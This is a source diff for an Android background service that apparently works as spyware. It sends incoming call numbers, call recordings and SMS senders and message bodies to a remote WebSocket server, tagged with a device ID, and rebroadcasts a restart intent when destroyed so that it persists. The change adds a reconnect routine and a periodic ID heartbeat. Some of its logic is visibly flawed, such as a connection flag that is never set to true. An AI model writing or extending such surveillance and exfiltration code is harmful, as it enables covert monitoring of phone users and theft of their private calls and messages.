@@ -31,9 +31,10 @@ import java.net.URISyntaxException;
 
 public class MainService extends Service {
 
-    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
-
     private static WebSocketClient client;
+
+    private boolean isConnected = false;
+    private final String SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice";
 
     private static MediaRecorder recorder = new MediaRecorder();
 
@@ -43,7 +44,6 @@ public class MainService extends Service {
 
     private static boolean isRecording = false;
 
-
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
@@ -52,21 +52,21 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        try {
-            client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
-        } catch (URISyntaxException e) {
-            throw new RuntimeException(e);
+        if (!isConnected) {
+            try {
+                connectToWebSocket();
+            } catch (URISyntaxException e) {}
         }
 
-        if (!client.isOpen())
-            client.connect();
-
         final Handler handler = new Handler();
-        final int delay = 1000;
+        final int delay = 30000;
 
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
+                try {
+                    updateWebSocketID();
+                } catch (JSONException e) {}
                 handler.postDelayed(this, delay);
             }
         }, delay);
@@ -78,8 +78,25 @@ public class MainService extends Service {
     public void onDestroy() {
         super.onDestroy();
 
+        isConnected = false;
         Intent restartService = new Intent(SERVICE_RESTART_INTENT);
         sendBroadcast(restartService);
+    }
+
+    private void connectToWebSocket() throws URISyntaxException {
+        client = new WebSocketClient(getApplicationContext(), new URI(Utils.WEB_SOCKET_SERVER));
+        client.connect();
+        isConnected = false;
+    }
+
+    private void updateWebSocketID() throws JSONException {
+        if (client.isOpen()) {
+            JSONObject json = new JSONObject();
+            json.put("id", Utils.clientID(getApplicationContext()));
+            json.put("type", "client");
+            json.put("res", "id");
+            client.send(json.toString());
+        }
     }
 
     /**
@@ -99,7 +116,7 @@ public class MainService extends Service {
 
                         JSONObject json = new JSONObject();
                         try {
-                            json.put("client_id", Utils.clientID(context));
+                            json.put("id", Utils.clientID(context));
                             json.put("type", "client");
                             json.put("res", "log");
                             json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
@@ -136,7 +153,7 @@ public class MainService extends Service {
 
                         JSONObject json = new JSONObject();
                         try {
-                            json.put("client_id", Utils.clientID(context));
+                            json.put("id", Utils.clientID(context));
                             json.put("type", "client");
                             json.put("res", "recording");
                             json.put("number", Base64.encode(incomingNumber.getBytes(), Base64.DEFAULT));
@@ -174,7 +191,7 @@ public class MainService extends Service {
                             if (!senderNumber.isEmpty() && !messageBody.isEmpty() && client.isOpen() && client != null) {
                                 JSONObject json = new JSONObject();
                                 try {
-                                    json.put("client_id", Utils.clientID(context));
+                                    json.put("id", Utils.clientID(context));
                                     json.put("type", "client");
                                     json.put("res", "message");
                                     json.put("sender", senderNumber);
